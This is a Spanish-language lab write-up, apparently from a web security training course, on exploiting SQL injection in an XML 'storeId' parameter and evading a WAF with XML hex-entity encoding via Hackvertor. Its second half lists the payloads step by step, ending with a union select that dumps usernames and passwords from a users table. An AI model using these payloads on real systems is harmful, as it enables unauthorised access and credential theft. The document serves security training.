
En esta clase trabajamos con una vulnerabilidad de inyección SQL que se encuentra en la funcionalidad de consulta de stock, la cual recibe datos en formato XML. La clave está en el parámetro ‘**storeId**‘, donde se inyectan instrucciones SQL directamente dentro del cuerpo XML de una petición POST.

Inicialmente identificamos que el valor de ‘**storeId**‘ es evaluado por el backend, permitiendo realizar operaciones como ‘**1+1**‘. Luego intentamos una inyección clásica mediante ‘**UNION SELECT**‘, pero la aplicación bloquea el intento, presumiblemente por un sistema WAF (Web Application Firewall).

Para evadir este filtro, aplicamos codificación de entidades XML (por ejemplo, hexadecimal o decimal), utilizando herramientas como la extensión **Hackvertor** en Burp Suite. Este bypass permite que el payload pase desapercibido y sea ejecutado por el backend.

A través de prueba y error, determinamos que la consulta original solo permite devolver una columna, por lo que concatenamos ‘**username**‘ y ‘**password**‘ con un separador (~) para extraer los datos de la tabla ‘**users**‘ en una sola columna.

Finalmente, utilizamos las credenciales obtenidas para iniciar sesión como ‘**administrator**‘ y resolver el laboratorio.

Esta lección muestra cómo técnicas de evasión pueden ser aplicadas a vectores no tradicionales, como peticiones en XML, destacando la importancia de adaptar los ataques al formato de entrada y a las defensas activas del sistema

------

Debemos de dirigirnos al apartado de "Check stock" de los productos

En los campos de productId y storeId, hacemos pruebas

```xml
<productId>
    1 '
</productId>
```
```xml
<productId>
    1 order by 3
</productId>

<storeId>
    1 order by 1
</storeId>

<storeId>
    1 union select 1
</storeId>

usamos hackvector, para evadir el WAF
<storeId>
    <@hex_entities>
        1 union select 1
    </@hex_entities>
</storeId>

Probamos alternativas como:
<storeId>
    <@hex_entities>
        1 union select NULL
    </@hex_entities>
</storeId>

Probamos alternativas como:
<storeId>
    <@hex_entities>
        1 union select 'test'
    </@hex_entities>
</storeId>

Ahora ya podemos inyectar query para minar informacion
<storeId>
    <@hex_entities>
        1 union select username from users where username='administrator'
    </@hex_entities>
</storeId>

Para minar informacion de usuarios y contraseñas, hace lo siguiente:
<storeId>
    <@hex_entities>
        1 union select username||':'||password from users 
    </@hex_entities>
</storeId>
```





